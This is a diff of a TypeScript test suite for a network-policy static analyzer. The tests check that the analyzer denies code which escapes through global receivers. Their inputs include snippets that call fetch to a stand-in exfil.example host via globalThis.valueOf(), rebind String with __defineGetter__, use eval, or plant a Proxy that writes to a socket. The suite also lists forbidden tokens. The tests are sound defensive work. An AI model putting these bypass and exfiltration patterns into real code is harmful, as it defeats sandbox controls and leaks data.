@@ -607,13 +607,13 @@ describe('D3 network policy receiver-call result authority inheritance (PR #67 F
     }
   });
 
-  it('F3: denies every global-root call-result witness through the existing global-receiver rules', () => {
+  it('F3: denies every invocation of a permitted global member at the call; its result is never followed', () => {
     for (const [source, reason] of [
-      [`globalThis.valueOf().fetch('https://exfil.example/');`, 'GLOBAL_RECEIVER_NETWORK_MEMBER'],
-      [`globalThis.global.valueOf().fetch('https://exfil.example/');`, 'GLOBAL_RECEIVER_NETWORK_MEMBER'],
-      [`const g = globalThis.valueOf();`, 'GLOBAL_RECEIVER_ESCAPE'],
-      [`window['valueOf']().WebSocket;`, 'GLOBAL_RECEIVER_NETWORK_MEMBER'],
-      [`use(self.valueOf());`, 'GLOBAL_RECEIVER_ESCAPE'],
+      [`globalThis.valueOf().fetch('https://exfil.example/');`, 'GLOBAL_RECEIVER_CALL'],
+      [`globalThis.global.valueOf().fetch('https://exfil.example/');`, 'GLOBAL_RECEIVER_CALL'],
+      [`const g = globalThis.valueOf();`, 'GLOBAL_RECEIVER_CALL'],
+      [`window['valueOf']().WebSocket;`, 'GLOBAL_RECEIVER_CALL'],
+      [`use(self.valueOf());`, 'GLOBAL_RECEIVER_CALL'],
     ] as const) {
       const result = analyzeNetworkPolicy(source);
       expect(result.verdict, source).toBe('DENY');
@@ -621,19 +621,19 @@ describe('D3 network policy receiver-call result authority inheritance (PR #67 F
     }
   });
 
-  it('F3: follows optional calls of permitted global members exactly like plain calls, with one finding each', () => {
+  it('F3: denies optional invocations of permitted global members exactly like plain ones, with one finding each', () => {
     for (const [source, reason] of [
-      [`globalThis.valueOf?.().fetch('x');`, 'GLOBAL_RECEIVER_NETWORK_MEMBER'],
-      [`globalThis?.valueOf?.().fetch('x');`, 'GLOBAL_RECEIVER_NETWORK_MEMBER'],
-      [`globalThis?.valueOf().fetch('x');`, 'GLOBAL_RECEIVER_NETWORK_MEMBER'],
-      [`globalThis['valueOf']?.().fetch('x');`, 'GLOBAL_RECEIVER_NETWORK_MEMBER'],
-      [`globalThis['valueOf']?.().WebSocket;`, 'GLOBAL_RECEIVER_NETWORK_MEMBER'],
-      [`(globalThis.valueOf?.() as any).fetch('x');`, 'GLOBAL_RECEIVER_NETWORK_MEMBER'],
-      [`globalThis.valueOf?.().self.fetch('x');`, 'GLOBAL_RECEIVER_NETWORK_MEMBER'],
-      [`const g = globalThis.valueOf?.();`, 'GLOBAL_RECEIVER_ESCAPE'],
-      [`use(globalThis.valueOf?.());`, 'GLOBAL_RECEIVER_ESCAPE'],
-      [`function g() { return window.valueOf?.(); }`, 'GLOBAL_RECEIVER_ESCAPE'],
-      [`declare const k: string;\nglobalThis.valueOf?.()[k];`, 'GLOBAL_RECEIVER_RUNTIME_KEY'],
+      [`globalThis.valueOf?.().fetch('x');`, 'GLOBAL_RECEIVER_CALL'],
+      [`globalThis?.valueOf?.().fetch('x');`, 'GLOBAL_RECEIVER_CALL'],
+      [`globalThis?.valueOf().fetch('x');`, 'GLOBAL_RECEIVER_CALL'],
+      [`globalThis['valueOf']?.().fetch('x');`, 'GLOBAL_RECEIVER_CALL'],
+      [`globalThis['valueOf']?.().WebSocket;`, 'GLOBAL_RECEIVER_CALL'],
+      [`(globalThis.valueOf?.() as any).fetch('x');`, 'GLOBAL_RECEIVER_CALL'],
+      [`globalThis.valueOf?.().self.fetch('x');`, 'GLOBAL_RECEIVER_CALL'],
+      [`const g = globalThis.valueOf?.();`, 'GLOBAL_RECEIVER_CALL'],
+      [`use(globalThis.valueOf?.());`, 'GLOBAL_RECEIVER_CALL'],
+      [`function g() { return window.valueOf?.(); }`, 'GLOBAL_RECEIVER_CALL'],
+      [`declare const k: string;\nglobalThis.valueOf?.()[k];`, 'GLOBAL_RECEIVER_CALL'],
       [`declare const k: string;\nglobalThis[k]?.().fetch('x');`, 'GLOBAL_RECEIVER_RUNTIME_KEY'],
     ] as const) {
       const result = analyzeNetworkPolicy(source);
@@ -646,6 +646,16 @@ describe('D3 network policy receiver-call result authority inheritance (PR #67 F
       `void globalThis.valueOf?.();`,
       `typeof globalThis.valueOf?.();`,
       `globalThis.valueOf?.().console.log('x');`,
+    ]) {
+      const result = analyzeNetworkPolicy(source);
+      expect(result.reasons, `${source}\n${describeFindings(result)}`).toEqual(['GLOBAL_RECEIVER_CALL']);
+      expect(result.findings, source).toHaveLength(1);
+    }
+    for (const source of [
+      `globalThis.console?.log?.('x');`,
+      `void globalThis.console;`,
+      `typeof globalThis.console;`,
+      `globalThis?.console.log('x');`,
     ]) {
       const result = analyzeNetworkPolicy(source);
       expect(result.reasons, `${source}\n${describeFindings(result)}`).toEqual([]);
@@ -661,8 +671,6 @@ describe('D3 network policy receiver-call result authority inheritance (PR #67 F
       withServer(`function setup(s: http.Server) { s.close(); }\nsetup(server.listen(4317, '127.0.0.1'));`),
       withServer(`const started = server.listen(4317, '127.0.0.1');\nstarted.close();`),
       `globalThis.console.log('x');`,
-      `globalThis.valueOf();`,
-      `globalThis.valueOf().console.log('x');`,
     ]) {
       const result = analyzeNetworkPolicy(source);
       expect(result.reasons, `${source}\n${describeFindings(result)}`).toEqual([]);
@@ -808,7 +816,7 @@ describe('D3 network policy receiver-call result authority inheritance (PR #67 F
     expect(occurrences(detector, 'function inheritingReceiverOf(')).toBe(1);
     expect(occurrences(detector, 'function classesOf(')).toBe(1);
     expect(occurrences(detector, 'factsOf(ctx, valueSymbolOf(')).toBe(1);
-    // The optional-call follow is confined to the global-receiver path; target classes keep the direct-call predicate.
+    // The invocation check (call, construct, tagged template) is confined to the global-receiver path; target classes keep the direct-call predicate.
     expect(occurrences(detector, 'const memberCallOf = ')).toBe(1);
     expect(occurrences(detector, 'memberCallOf(parent)')).toBe(1);
     expect(occurrences(detector, 'inheritingReceiverOf(ctx, ')).toBe(1);
@@ -1066,7 +1074,7 @@ describe('D3 network policy closes the open Codex findings on PR #67', () => {
     const fluentResponse = analyzeNetworkPolicy(`${NS}\nhttp.createServer((request, response) => { response.setHeader('a', 'b').socket; });`);
     expect(fluentResponse.reasons, describeFindings(fluentResponse)).toEqual(['RESPONSE_MEMBER']);
     const laundered = analyzeNetworkPolicy(`const g = globalThis.valueOf() as typeof globalThis;\ng.fetch('https://exfil.example/');`);
-    expect(laundered.reasons, describeFindings(laundered)).toEqual(['GLOBAL_RECEIVER_ESCAPE']);
+    expect(laundered.reasons, describeFindings(laundered)).toEqual(['GLOBAL_RECEIVER_CALL']);
     const twice = analyzeNetworkPolicy(`${NS}\nfunction make() { return http.createServer(${L}); }\nconst a = make();\nconst b = make();\na.listen(4317, '127.0.0.1');\nb.listen(4318, '0.0.0.0');`);
     expect(twice.reasons, describeFindings(twice)).toEqual(['CREATE_SERVER_MULTIPLE', 'SERVER_LISTEN_BINDING']);
   });
@@ -1099,7 +1107,6 @@ http.createServer((request, response) => { response.end(String(1)); });`,
     );
     expect(witness.reasons, describeFindings(witness)).toEqual(['GLOBAL_RECEIVER_WRITE']);
     for (const source of [
-      `globalThis.String(1);`,
       `String(1);`,
       `globalThis.String.length;`,
       `typeof globalThis.String;`,
@@ -1178,6 +1185,66 @@ ${describeFindings(result)}`).toEqual([]);
     expect(occurrences(detector, 'function checkProcessUse(')).toBe(1);
     expect(occurrences(detector, 'checkProcessUse(ctx, ')).toBe(2);
     for (const forbidden of ['_getActiveHandles', 'getBuiltinModule', 'binding', 'cwd', 'env']) {
+      expect(occurrences(detector, `'${forbidden}'`), forbidden).toBe(0);
+    }
+  });
+
+  it('P1: a member of a global receiver is never invoked: mutator, generator, construct and tagged-template forms alike', () => {
+    for (const source of [
+      `(globalThis as any).__defineGetter__('String', () => (value: unknown) => value);`,
+      `(globalThis as any).__defineSetter__('String', () => {});`,
+      `(globalThis as any)['__define' + 'Getter__']('String', () => 1);`,
+      `(globalThis.globalThis as any).__defineGetter__('String', () => 1);`,
+      `(window as any).__defineGetter__('fetch', () => 1);`,
+      `(self as any).__defineGetter__?.('String', () => 1);`,
+      `(global as any)?.__defineGetter__('String', () => 1);`,
+      `globalThis.eval('String = 1');`,
+      `globalThis.Function('return String')();`,
+      `new (globalThis as any).Proxy({}, {});`,
+      `globalThis.String\`x\`;`,
+      `globalThis.String(1);`,
+      `globalThis.valueOf();`,
+      `void globalThis.valueOf();`,
+      `typeof globalThis.String(1);`,
+      `const s = globalThis.String(1);\ns;`,
+    ]) {
+      const result = analyzeNetworkPolicy(source);
+      expect(result.reasons, `${source}\n${describeFindings(result)}`).toEqual(['GLOBAL_RECEIVER_CALL']);
+      expect(result.findings, source).toHaveLength(1);
+      expect(result.fixpoint.state, source).toBe('CONVERGED');
+    }
+    // Codex witness: an inherited mutator rebinds `String` without a write target, so `isProvenString` would trust a callable Proxy.
+    const witness = analyzeNetworkPolicy(
+      `${NS}\n(globalThis as any).__defineGetter__('String', () => () => new Proxy(() => {}, { apply(_target: unknown, res: http.ServerResponse) { res.req.socket.write('x'); } }));\nhttp.createServer((request, response) => { response.end(String(1)); });`,
+    );
+    expect(witness.reasons, describeFindings(witness)).toEqual(['GLOBAL_RECEIVER_CALL']);
+    // The same family through a free mutator: the receiver forwarded as an argument is already an escape.
+    for (const source of [
+      `Object.defineProperty(globalThis, 'String', { value: 1 });`,
+      `Reflect.set(window, 'String', 1);`,
+      `Object.assign(self, { String: 1 });`,
+      `(Object.prototype as any).__defineGetter__.call(globalThis, 'String', () => 1);`,
+    ]) {
+      const result = analyzeNetworkPolicy(source);
+      expect(result.reasons, `${source}\n${describeFindings(result)}`).toEqual(['GLOBAL_RECEIVER_ESCAPE']);
+    }
+    // Free-global calls go through no receiver; reads of permitted members stay permitted.
+    for (const source of [
+      `String(1);`,
+      `Number('1');`,
+      `Object.keys({});`,
+      `globalThis.console.log('x');`,
+      `globalThis.console;`,
+      `typeof globalThis.String;`,
+      `globalThis.String.length;`,
+      `const { console: c } = globalThis;\nc.log('x');`,
+    ]) {
+      const result = analyzeNetworkPolicy(source);
+      expect(result.reasons, `${source}\n${describeFindings(result)}`).toEqual([]);
+    }
+    const detector = readFileSync(detectorPath, 'utf8');
+    expect(occurrences(detector, "deny(ctx, 'GLOBAL_RECEIVER_CALL'")).toBe(1);
+    for (const forbidden of ['__defineGetter__', '__defineSetter__', 'defineProperty', 'eval']) {
       expect(occurrences(detector, `'${forbidden}'`), forbidden).toBe(0);
     }
   });
